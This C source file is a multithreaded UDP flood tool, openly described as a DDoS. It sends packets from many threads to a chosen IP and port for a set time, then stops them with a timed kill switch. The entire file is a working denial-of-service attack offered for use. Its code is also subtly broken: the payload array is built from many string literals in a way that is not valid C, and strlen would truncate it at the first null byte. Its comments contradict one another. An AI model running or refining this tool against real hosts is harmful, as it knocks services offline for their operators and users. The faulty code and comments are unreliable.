#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h> 
#include <time.h> 
#include <stdatomic.h>

// DDoS with less payload powerfull kill switch , Packets Delay and Cleaner Shutdown from target

void usage() {
    printf("Usage: ./beta1 <ip> <port> <duration> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    atomic_int *stop; // Shared variable to stop threads
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Reduced size payload for lighter traffic
    char payload[] = {
        "\xd9\x00\xd9\x00\xd9\x00", // Small initial payload
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00",
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00",
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00",
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00", 
        "\x00\x00\xd9\x00\xd9\x00", 
    
        // Repeated payload
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB", 
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB", 
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",

        // Larger, more complex payloads added for increased power
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA",
        "\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5",
        "\xC4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F\xDE\x1E\x09\xDF\x3A\x37\xB7\x63",

        "\x12\x34\x56\x78\x9A\xBC\xDE\xF0\xF0\xDE\xBC\x9A\x78\x56\x34\x12\x00\xFF\xAA\xBB\xCC\xDD\xEE\xFF\xEE\xDD\xCC",
        "\xBB\xAA\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\x00\xAA\xBB\xCC\xDD\x11\x22\x33\x44\x55\x66\x77\x88\x99\xFF",

        "\xFF\xFF\xFF\xFF\xEE\xEE\xDD\xDD\xCC\xCC\xBB\xBB\xAA\xAA\x99\x99\x88\x88\x77\x77\x66\x66\x55\x55\x44\x44\x33",
        "\x33\x22\x22\x11\x11\x00\x00\xFF\xFF\xEE\xEE\xDD\xDD\xCC\xCC\xBB\xBB\xAA\xAA\x99\x99\x88\x88\x77\x77\x66\x66",

        // Expanded complex payloads
        "\x24\x6C\xAD\xFF\xDB\x95\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xC9\xF5\x84\x9B\x16\x67\x1C\x7F\x3D\x8E\x85\x35\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\x9B\x72\xEF\xCF\x00\x3E\xAB\xAD\x47\xB8\xAB\x50\x1B\x14\x3C\xEC\xDB\xCA\xED\x9E\x73\x76\x70\xD7\x17\xB1",
        "\x24\x6C\xAD\xFF\xDB\x95\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xC9\xF5\x84\x9B\x16\x67\x1C\x7F\x3D\x8E\x85\x35\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\x9B\x72\xEF\xCF\x00\x3E\xAB\xAD\x47\xB8\xAB\x50\x1B\x14\x3C\xEC\xDB\xCA\xED\x9E\x73\x76\x70\xD7\x17\xB1",
        "\x24\x6C\xAD\xFF\x2F\xEA\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xD1\xF5\x04\x98\x16\x17\x1C\x7F\x9D\x8E\xF9\x34\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\xC4\x73\xEF\xC8\x06\x3E\xAB\xAD\x47\xA0\x8B\x2F\xD1\x6B\x64\x14\x4B\x54\x23\xB0\x45\x43\x1C\x0F\x5F\xE9\xA2\x1A\xC8\xF5\xD8\x85\x82\x26\x43\x1F\x90\xFC\x0D\x92\xD9\xE8\x19\xC6\x89\xE3\xD9\x46\x09\xDC\x0E\xFB\xB5\x4C\x84\x78\xB3\xD1\x3D\xFD\xB6\x14\x7D\x70\xCA\x3A\xFD\xD3\xFF\x07\xB3\x72\x92\x5C\x09\xE2\x41\xB8\x8F\x6D\xA3\xE9\xC4\xB5\x64\x56\xDF\x27\xD2\xC6\x86\xC5\xB4\x46\x44\xE1\xBC\xBC\x0C",
    
        // Increased size and complexity
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
    
        // Further extensions
        "\xAB\xCD\xEF\x01\x23\x45\x67\x89\x9A\xBC\xDE\xF0\x12\x34\x56\x78\x90\xFE\xDC\xBA\x98\x76\x54\x32\x10\x09\x87\x65\x43\x21\x0F\xF1\xE2\xD3\xC4\xB5\xA6\x97\x88\x79\x6A\x5B\x4C\x3D\x2E\x1F", 
        "\x24\xFF\xEE\xDD\xCC\xBB\xAA\x99\x88\x77\x66\x55\x44\x33\x22\x11\x00\xEF\xFE\xDD\xCC\xBB\xAA\x99\x88\x77\x66\x55\x44\x33\x22\x11\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F",
        "\xDE\xAD\xBE\xEF\xCA\xFE",
        
    }; // Small, simple payload for reduced server load

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    while (!atomic_load(data->stop)) {
        if (sendto(sock, payload, strlen(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
        // Introducing a small delay to reduce server load and prevent jamming
        usleep(100);  // 100 microsecond delay between packets
    }

    close(sock);
    pthread_exit(NULL);
}

void start_attack(char *ip, int port, int duration, int threads) {
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    atomic_int stop = 0;  // Initialize stop flag to 0
    struct thread_data data = {ip, port, duration, &stop};

    printf("Starting attack on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    // Start all threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    // Sleep for the attack duration
    sleep(duration);

    // Activate kill switch by setting the stop flag to 1
    atomic_store(&stop, 1);

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished and stopped cleanly.\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Initiate the attack
    start_attack(ip, port, duration, threads);

    return 0;
}
